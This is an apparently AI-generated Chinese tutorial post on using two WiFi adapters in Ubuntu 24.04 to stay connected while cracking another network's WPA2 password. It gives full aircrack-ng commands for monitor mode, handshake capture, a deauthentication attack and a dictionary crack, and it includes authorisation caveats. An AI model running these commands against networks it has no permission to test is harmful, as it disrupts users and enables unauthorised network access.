---
audio: false
generated: true
image: false
lang: zh
layout: post
model: x-ai/grok-4-fast
title: 双WiFi适配器在安全测试中的应用
translated: true
type: note
---

是的，Ubuntu 24.04 可以连接一个已知密码的 WiFi 网络（用于上网），同时尝试"破解"（例如测试）另一个 WiFi 网络的密码，但这需要特定硬件和仔细配置以避免冲突。这种设置通常用于对自己网络进行道德渗透测试或安全审计——请注意未经授权的访问是违法的。

### 关键要求
- **两个 WiFi 适配器**：至少需要两个独立的无线接口（例如内置笔记本 WiFi 作为 `wlan0` 用于连接，USB WiFi 适配器作为 `wlan1` 用于监控）。单个适配器无法同时处于连接状态（托管模式）和监控模式。
  - 推荐用于监控模式的适配器：Intel（如 AX200/AX210）、Atheros 或兼容的 Realtek 芯片组。使用 `iw list` 检查兼容性（查看支持的接口模式中是否有"monitor"）。
- **工具**：安装 `aircrack-ng` 套件用于扫描、捕获握手包和破解：
  ```
  sudo apt update && sudo apt install aircrack-ng
  ```
- **Ubuntu 24.04 注意事项**：与之前版本相比没有重大变化——NetworkManager 处理连接，但监控模式工具如果管理不当可能会产生干扰。内核 6.8+ 对现代适配器支持良好。

### 工作原理：分步设置
1. **连接已知 WiFi（托管模式）**：
   - 使用 NetworkManager（GUI 或 CLI）正常连接：
     ```
     nmcli device wifi connect "YourKnownSSID" password "knownpassword"
     ```
   - 验证：`nmcli connection show --active`。这将在第一个接口（如 `wlan0`）上保持网络活动。

2. **设置第二个适配器用于监控（不干扰第一个）**：
   - 识别接口：`iw dev`（例如 `wlan1` 是 USB 适配器）。
   - 避免使用 `airmon-ng`（来自 aircrack-ng），因为它经常终止 NetworkManager 并中断连接。改用手动 `iw` 命令：
     ```
     sudo ip link set wlan1 down
     sudo iw dev wlan1 set type monitor
     sudo ip link set wlan1 up
     ```
   - 验证：`iw dev`（应显示 `wlan1` 的 `type monitor`）。

3. **扫描和捕获用于密码破解**：
   - 扫描网络：`sudo airodump-ng wlan1`（列出 SSID、BSSID、信道；按 Ctrl+C 停止）。
   - 定位特定网络（例如 BSSID `AA:BB:CC:DD:EE:FF` 在信道 6）：
     ```
     sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF --channel 6 -w capture wlan1
     ```
     这将捕获数据包到 `capture-01.cap`。对于 WPA2 破解，等待四次握手（或通过取消认证强制获取：`sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan1`）。
   - 离线破解：`sudo aircrack-ng -w /path/to/wordlist.txt -b AA:BB:CC:DD:EE:FF capture-01.cap`。

4. **恢复正常操作**：
   - 停止监控：
     ```
     sudo ip link set wlan1 down
     sudo iw dev wlan1 set type managed
     sudo ip link set wlan1 up
     ```
   - 需要时重新连接：重启 NetworkManager（`sudo systemctl restart NetworkManager`）或使用 `nmcli`。

### 潜在问题及修复
- **连接断开**：如果第一个 WiFi 断开连接（手动方法很少发生），更新 DHCP：`sudo dhclient -r wlan0 && sudo dhclient wlan0`。
- **干扰**：仅在监控接口上终止冲突进程：`sudo airmon-ng check kill`（但这会影响所有接口——谨慎使用）。
- **USB 适配器稳定性**：某些廉价适配器在监控模式下会掉线；使用 `iwconfig` 或 `iw dev` 测试。
- **有线替代方案**：如果没有第二个 WiFi，使用有线网络上网并在单个 WiFi 适配器上监控（更简单，因为终止 NetworkManager 不会影响有线连接）。

此设置在 Ubuntu 24.04 上可可靠用于测试目的。测试网络前务必获得许可。

### 参考资料
- [How to enable WiFi while using two wireless cards one in monitor mode](https://security.stackexchange.com/questions/121215/how-to-enable-wifi-while-using-two-wireless-cards-one-in-monitor-mode-and-other)
- [Wireless Packet Capture using Ubuntu 24 LTS](https://www.reddit.com/r/RGNets/comments/1l4672v/wireless_packet_capture_using_ubuntu_24_lts/)
- [Aircrack-ng Newbie Guide](https://www.aircrack-ng.org/doku.php?id=newbie_guide)
